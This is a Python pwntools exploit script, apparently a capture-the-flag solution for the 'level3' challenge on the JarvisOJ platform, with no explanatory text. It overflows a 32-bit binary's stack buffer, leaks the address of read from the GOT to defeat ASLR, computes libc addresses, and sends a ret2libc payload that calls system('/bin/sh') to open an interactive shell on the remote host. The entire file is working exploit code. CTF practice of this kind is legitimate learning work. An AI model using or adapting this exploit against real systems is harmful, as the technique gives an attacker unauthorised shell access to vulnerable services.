#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = 'debug'

local = 0
if local:
    io = process('../elf/level3/level3')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('pwn2.jarvisoj.com', 9879)
    libc = ELF('../elf/level3/libc-2.19.so')

elf = ELF('../elf/level3/level3')
start_elf_addr = elf.symbols['_start']
write_elf_addr = elf.symbols['write']
read_got_addr = elf.got['read']
read_libc_addr = libc.symbols['read']
sys_libc_addr = libc.symbols['system']
sh_libc_addr = libc.search('/bin/sh').next()

payload = 'A' * (0x88 + 0x04) + p32(write_elf_addr) + p32(start_elf_addr) + p32(0x1) + p32(read_got_addr) + p32(0x4)

io.recvuntil('Input:\n')
io.send(payload)

read_addr = u32(io.recv(4))
offset = read_addr - read_libc_addr

sys_addr = offset + sys_libc_addr
sh_addr = offset + sh_libc_addr

payload = 'A' * (0x88 + 0x4) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)
io.recvuntil('Input:\n')

io.send(payload)
io.interactive()
io.close()
